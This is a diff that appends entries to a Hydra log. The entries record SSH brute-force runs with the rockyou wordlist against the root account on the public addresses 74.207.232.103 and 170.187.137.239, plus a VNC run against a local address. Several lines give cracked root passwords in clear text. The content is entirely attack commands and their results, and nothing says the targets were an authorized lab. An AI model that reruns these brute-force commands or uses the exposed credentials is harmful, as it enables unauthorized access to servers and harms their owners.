@@ -8,3 +8,12 @@
 # Hydra v9.5 run at 2023-07-05 18:46:14 on 74.207.232.103 ssh (hydra -l root -P rockyou.txt -t 64 -vV -o output.log -I ssh://74.207.232.103)
 # Hydra v9.5 run at 2023-07-05 18:47:11 on 74.207.232.103 ssh (hydra -l root -P rockyou.txt -t 64 -vV -o output.log -I ssh://74.207.232.103)
 [22][ssh] host: 74.207.232.103   login: root   password: kejre6-biXcik-wyjhyk
+# Hydra v9.5 run at 2023-07-06 17:00:03 on 170.187.137.239 ssh (hydra -l root -P rockyou.txt -t 64 -vV -o output.log -I ssh://170.187.137.239)
+[22][ssh] host: 170.187.137.239   login: root   password: typwun-ditXub-gipzo6
+# Hydra v9.5 run at 2023-07-06 17:02:17 on 170.187.137.239 ssh (hydra -l root -P rockyou.txt -t 64 -vV -o output.log -I ssh://170.187.137.239)
+# Hydra v9.5 run at 2023-07-06 17:03:30 on 170.187.137.239 ssh (hydra -l root -P rockyou.txt -t 64 -vV -o output.log -I ssh://170.187.137.239)
+[22][ssh] host: 170.187.137.239   login: root   password: typwun-ditXub-gipzo6
+# Hydra v9.5 run at 2023-07-06 17:09:24 on 74.207.232.103 ssh (hydra -l root -P rockyou.txt -t 64 -vV -o output.log -I ssh://74.207.232.103)
+# Hydra v9.5 run at 2023-07-06 17:10:02 on 74.207.232.103 ssh (hydra -l root -P rockyou.txt -t 64 -vV -o output.log -I ssh://74.207.232.103)
+[22][ssh] host: 74.207.232.103   login: root   password: hejcot-1Savzu-simxyt
+# Hydra v9.5 run at 2023-07-06 18:05:06 on 192.168.1.80 vnc (hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://192.168.1.80)
